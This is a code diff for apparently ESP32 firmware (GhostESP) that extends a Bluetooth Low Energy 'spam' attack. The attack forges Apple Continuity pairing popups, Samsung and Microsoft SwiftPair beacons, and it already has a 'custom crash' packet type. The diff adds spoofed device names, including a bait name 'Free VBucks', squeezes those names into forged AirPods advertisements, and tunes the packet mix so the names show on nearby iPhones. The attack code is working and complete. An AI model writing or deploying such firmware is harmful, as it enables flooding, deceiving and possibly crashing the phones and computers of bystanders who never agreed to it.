@@ -35,6 +35,17 @@ typedef enum {
     ContinuityTypeCustomCrash   = 0xFF,  // special: re-uses NearbyAction wire type
 } ContinuityType;
 
+// Bytes of a 31-byte ProximityPair AD payload that are not the 16-byte
+// encrypted tail, i.e. header(6) + fixed fields(9). The tail plus a Complete
+// Local Name record must fit in the 14 bytes this leaves, so a named
+// ProximityPair can carry at most a 14-character name.
+#define PP_FIXED_LEN_TOTAL 14
+
+// Longest name a named ProximityPair can carry in-frame (fills the payload
+// with a zero-length tail). Beyond this the name is shortened in-frame but
+// still sent in full via the scan response.
+#define PP_NAME_MAX 14
+
 // 16-bit model codes (big-endian on wire: model_hi then model_lo)
 static const uint16_t continuity_pp_models[] = {
     0x0E20, // AirPods Pro
@@ -248,6 +259,87 @@ static SemaphoreHandle_t spam_task_exit_sem = NULL;
 static volatile bool spam_running        = false;
 static ble_spam_type_t current_spam_type = BLE_SPAM_APPLE;
 
+// Custom name advertised alongside the spam packets. Empty means "use the
+// built-in name list" (SwiftPair only) and no name record is appended.
+static char spam_custom_name[BLE_SPAM_NAME_MAX + 1] = {0};
+
+// Latches when the scan response API is unavailable, to warn only once.
+static bool spam_rsp_unsupported = false;
+
+// AD type for "Complete Local Name"
+#define SPAM_AD_TYPE_COMPLETE_NAME 0x09
+
+// ============================================================================
+// Advertised name handling
+// ============================================================================
+
+// Curated names for the Microsoft SwiftPair beacon. SwiftPair is the only
+// spam protocol here whose name the target OS actually displays, so this is
+// where a custom name has visible effect. Edit this list to taste.
+static const char *const swiftpair_names[] = {
+    "AirPods Pro",
+    "Beats Studio 3",
+    "AirPods Max",
+    "T-Deck",
+    "GhostESP",
+    "Surface Laptop",
+    "Xbox Wireless",
+    "Pixel Buds Pro",
+    "Free VBucks",
+    "Galaxy Buds3",
+    "Studio Display",
+    "Magic Trackpad",
+};
+#define SWIFTPAIR_NAME_COUNT (sizeof(swiftpair_names) / sizeof(swiftpair_names[0]))
+
+/**
+ * @brief Append a Complete Local Name record at @p off, if it fits.
+ *
+ * @return number of bytes written, or 0 if no name is set or it does not fit
+ */
+static size_t write_local_name(uint8_t *buf, size_t off, size_t max_len) {
+    size_t name_len = strlen(spam_custom_name);
+    if (name_len == 0) return 0;
+    // 1 byte AD length + 1 byte AD type + name
+    if (off + name_len + 2 > max_len) return 0;
+
+    buf[off]     = (uint8_t)(name_len + 1);
+    buf[off + 1] = SPAM_AD_TYPE_COMPLETE_NAME;
+    memcpy(&buf[off + 2], spam_custom_name, name_len);
+    return name_len + 2;
+}
+
+/**
+ * @brief Load the name for the current packet into the scan response.
+ *
+ * GhostESP never set a scan response before, but the Apple spam advertises
+ * as a scannable ADV_SCAN_IND (conn_mode NON + disc_mode GEN), so this data
+ * is actually transmitted to any client that sends a scan request.
+ */
+static void spam_apply_scan_response(void) {
+    uint8_t rsp[31];
+    size_t  rsp_len = write_local_name(rsp, 0, sizeof(rsp));
+
+    int rc = ble_gap_adv_rsp_set_data(rsp_len ? rsp : NULL, (int)rsp_len);
+    if (rc == BLE_HS_EBUSY) {
+        // Advertising was still running; the next loop iteration retries.
+        return;
+    }
+    if (rc == BLE_HS_ENOTSUP) {
+        // ble_gap_adv_rsp_set_data() is compiled out when NimBLE extended
+        // advertising is enabled. Warn once instead of every packet.
+        if (!spam_rsp_unsupported) {
+            spam_rsp_unsupported = true;
+            glog("Warning: BLE extended advertising is enabled, scan response "
+                 "unavailable; Apple names will not appear\n");
+        }
+        return;
+    }
+    if (rc != 0) {
+        glog("Warning: scan response set failed (%d)\n", rc);
+    }
+}
+
 // ============================================================================
 // Helpers
 // ============================================================================
@@ -321,6 +413,82 @@ static size_t build_continuity_proximity_pair(uint8_t *buf) {
     i += 16;
 
     return i; // should be 31
+}
+
+/**
+ * ProximityPair (type 0x07) carrying a Complete Local Name in the same
+ * advertisement, as two AD elements:
+ *
+ *   [len][0xFF][0x4C][0x00][0x07][cont_len][...9 byte fixed...][tail]
+ *   [len][0x09]["AirPods name"]
+ *
+ * The stock ProximityPair is 31/31 bytes, so the only way to get a name into
+ * the advertisement itself is to shorten the 16 byte "encrypted payload"
+ * tail, which we cannot decrypt or authenticate anyway. The Continuity
+ * Length field is variable per the spec (furiousMAC/continuity
+ * messages/proximity_pairing.md), so a short frame is structurally legal.
+ *
+ * A name in the ADV is far more reliable than one in the scan response,
+ * because iOS only sends a scan request intermittently - that is why the
+ * scan-response-only version showed the name only on some popups.
+ *
+ * Budget: header(6) + fixed(9) + tail + name(2 + n) <= 31, so tail + n <= 14.
+ * Short names keep a fatter, more realistic tail; long names eat into it.
+ *
+ * @return bytes written to buf
+ */
+static size_t build_continuity_proximity_pair_named(uint8_t *buf, const char *name,
+                                                    size_t name_len) {
+    // Longest name that still leaves a zero-length tail.
+    if (name_len > PP_NAME_MAX) name_len = PP_NAME_MAX;
+
+    size_t tail = PP_FIXED_LEN_TOTAL - name_len; // 14 - name_len
+    if (tail > 16) tail = 16;                    // never exceed the stock tail
+
+    uint8_t model_idx = esp_random() % CONTINUITY_PP_MODEL_COUNT;
+    uint16_t model    = continuity_pp_models[model_idx];
+
+    uint8_t prefix;
+    if (model == 0x0055 || model == 0x0030)
+        prefix = 0x05;
+    else
+        prefix = (esp_random() % 2) ? 0x07 : 0x01;
+
+    uint8_t color = esp_random() % 16;
+
+    uint8_t i = 0;
+    uint8_t cont_len = (uint8_t)(9 + tail); // bytes after the cont_len byte
+    uint8_t total    = (uint8_t)(6 + cont_len);
+
+    buf[i++] = total - 1;                        // AD length
+    buf[i++] = 0xFF;                             // Manufacturer Specific
+    buf[i++] = 0x4C;                             // Apple
+    buf[i++] = 0x00;
+    buf[i++] = ContinuityTypeProximityPair;       // 0x07
+    buf[i++] = cont_len;                         // continuity data length
+
+    buf[i++] = prefix;                           // 0x01/0x07/0x05
+    buf[i++] = (model >> 8) & 0xFF;              // model high
+    buf[i++] = (model >> 0) & 0xFF;              // model low
+    buf[i++] = 0x55;                             // status
+    buf[i++] = ((esp_random() % 10) << 4) | (esp_random() % 10); // buds battery
+    buf[i++] = ((esp_random() % 8) << 4) | (esp_random() % 10);  // case battery
+    buf[i++] = esp_random() & 0xFF;              // lid open counter
+    buf[i++] = color;                            // color
+    buf[i++] = 0x00;                             // suffix
+
+    if (tail > 0) {
+        esp_fill_random(&buf[i], tail);
+        i += tail;
+    }
+
+    // Second AD element: Complete Local Name
+    buf[i++] = (uint8_t)(name_len + 1);
+    buf[i++] = SPAM_AD_TYPE_COMPLETE_NAME;
+    memcpy(&buf[i], name, name_len);
+    i += name_len;
+
+    return i;
 }
 
 /**
@@ -404,10 +572,28 @@ static size_t build_continuity_custom_crash(uint8_t *buf) {
 }
 
 /**
- * Randomly pick one of the three Apple Continuity packet types.
+ * Pick one of the three Apple Continuity packet types.
  * Returns the length of the single raw AD record written into buf.
+ *
+ * When a custom name is set the mix is heavily biased toward ProximityPair.
+ * NearbyAction popups (Apple TV, HomePod, "Setup New iPhone", ...) render
+ * iOS-localised strings keyed on the action type byte, so a name can never
+ * appear on them. The AirPods/Beats ProximityPair popup is the one popup that
+ * displays a device-supplied name, so it is the only one worth aiming at.
  */
 static size_t build_apple_continuity_adv(uint8_t *buf) {
+    if (spam_custom_name[0] != '\0') {
+        // 7 in 8 ProximityPair so the name actually gets tested, with the
+        // other two types still appearing now and then for variety.
+        if (esp_random() % 8 == 7) {
+            return esp_random() % 2 ? build_continuity_custom_crash(buf)
+                                    : build_continuity_nearby_action(buf);
+        }
+        // Name goes in the advertisement itself, not just the scan response.
+        return build_continuity_proximity_pair_named(buf, spam_custom_name,
+                                                     strlen(spam_custom_name));
+    }
+
     switch (esp_random() % 3) {
         case 0:  return build_continuity_proximity_pair(buf);
         case 1:  return build_continuity_nearby_action(buf);
@@ -539,13 +725,19 @@ static size_t build_samsung_adv(uint8_t *buf) {
 // ============================================================================
 
 static size_t build_swiftpair_adv(uint8_t *buf) {
-    // Generate a short random name (printable ASCII)
-    static const char charset[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
-    uint8_t name_len = (esp_random() % 7) + 2; // 2..8 chars
-    char name[9];
-    for (uint8_t n = 0; n < name_len; n++)
-        name[n] = charset[esp_random() % (sizeof(charset) - 1)];
-    name[name_len] = '\0';
+    // The SwiftPair beacon ends in a human readable device name, which the
+    // target OS renders verbatim. Prefer the user supplied name, else cycle
+    // the built-in list, else fall back to a short random string.
+    const char *name;
+    if (spam_custom_name[0] != '\0') {
+        name = spam_custom_name;
+    } else {
+        name = swiftpair_names[esp_random() % SWIFTPAIR_NAME_COUNT];
+    }
+
+    size_t name_len = strlen(name);
+    // 3 byte flags prefix prepended by spam_task + this record must fit 31
+    if (name_len > 21) name_len = 21;
 
     uint8_t size = 7 + name_len; // total record size including length byte
     uint8_t i = 0;
@@ -671,6 +863,14 @@ static void spam_task(void *arg) {
             continue;
         }
 
+        // Append a Complete Local Name record if the protocol record left
+        // room for one. Apple Proximity Pair fills all 31 bytes, so for that
+        // packet the name only rides in the scan response below.
+        {
+            size_t added = write_local_name(adv_data, adv_len, 31);
+            adv_len += added;
+        }
+
         // --- Set advertisement data ---
         int rc = ble_gap_adv_set_data(adv_data, adv_len);
         if (rc != 0) {
@@ -679,11 +879,21 @@ static void spam_task(void *arg) {
             continue;
         }
 
+        // --- Set scan response (carries the name when the payload cannot) ---
+        spam_apply_scan_response();
+
         // --- Configure advertisement parameters ---
         struct ble_gap_adv_params adv_params;
         memset(&adv_params, 0, sizeof(adv_params));
         adv_params.conn_mode  = BLE_GAP_CONN_MODE_NON;
-        adv_params.disc_mode  = is_apple ? BLE_GAP_DISC_MODE_GEN : BLE_GAP_DISC_MODE_NON;
+        // A scan response is only transmitted for the scannable ADV_SCAN_IND,
+        // which NimBLE selects for CONN_MODE_NON + DISC_MODE_GEN. Without this
+        // the non-Apple modes would advertise as ADV_NONCONN_IND and any name
+        // in the scan response would never reach the air. Both PDU types are
+        // non-connectable, so this does not invite connections.
+        adv_params.disc_mode  = (is_apple || spam_custom_name[0] != '\0')
+                                   ? BLE_GAP_DISC_MODE_GEN
+                                   : BLE_GAP_DISC_MODE_NON;
         adv_params.channel_map = 0x07; // all three channels
 
         // Interval: use 20ms equivalent (0x20 = 20*0.625ms = 12.5ms, close enough)
@@ -739,6 +949,44 @@ static void spam_task(void *arg) {
 // ============================================================================
 // Public API
 // ============================================================================
+
+bool ble_spam_set_name(const char *name) {
+    if (name == NULL || name[0] == '\0') {
+        spam_custom_name[0] = '\0';
+        glog("BLE spam name cleared\n");
+        return false;
+    }
+
+    // Keep it printable ASCII and single line: the name goes straight into an
+    // advertisement record, and control bytes would corrupt the AD framing.
+    size_t out = 0;
+    for (size_t i = 0; name[i] != '\0' && out < BLE_SPAM_NAME_MAX; i++) {
+        char c = name[i];
+        if (c < 0x20 || c > 0x7E) c = ' ';
+        spam_custom_name[out++] = c;
+    }
+    spam_custom_name[out] = '\0';
+
+    if (out == 0) {
+        spam_custom_name[0] = '\0';
+        return false;
+    }
+
+    glog("BLE spam name set to '%s'%s\n",
+         spam_custom_name,
+         (out < strlen(name)) ? " (truncated)" : "");
+    if (out > PP_NAME_MAX) {
+        glog("Note: Apple ProximityPair can only carry %d chars in-frame; "
+             "'%s' will be shortened to '%.*s' for Apple spam (the full name "
+             "still goes to the scan response and SwiftPair)\n",
+             PP_NAME_MAX, spam_custom_name, PP_NAME_MAX, spam_custom_name);
+    }
+    return true;
+}
+
+const char *ble_spam_get_name(void) {
+    return spam_custom_name;
+}
 
 void ble_spam_start(ble_spam_type_t type) {
     if (spam_running) {
